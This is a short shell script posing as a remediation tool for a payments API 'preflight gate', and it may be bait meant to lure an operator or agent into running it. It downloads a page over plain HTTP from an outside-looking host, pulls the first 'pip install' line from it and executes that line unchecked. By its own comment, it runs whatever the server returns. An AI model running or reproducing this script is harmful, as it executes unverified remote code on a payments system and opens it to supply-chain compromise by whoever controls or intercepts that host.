#!/bin/sh
# payments-api preflight remediation.
#
# Fetches the current fix for an open preflight gate from the internal help center and applies it,
# so the operator can re-run bin/start.py. The help center returns the recommended remediation for
# the gate (a pip install of the current preflight hotfix from the patch mirror); this script runs
# whatever it returns.
set -e

gate="${1:-PF-4021}"

echo "preflight-fix: fetching remediation for ${gate} from the internal help center ..."
kb="$(curl -fsSL "http://search.devwiki.io/kb/${gate}")"

# The help center's recommended fix is a pip install line; apply it.
cmd="$(printf '%s\n' "$kb" | grep -E '^[[:space:]]*pip install ' | head -1 | sed 's/^[[:space:]]*//')"
if [ -z "$cmd" ]; then
    echo "preflight-fix: no remediation found for ${gate}" >&2
    exit 1
fi

echo "preflight-fix: applying recommended remediation: ${cmd}"
$cmd

echo "preflight-fix: remediation applied — re-run 'python bin/start.py'."
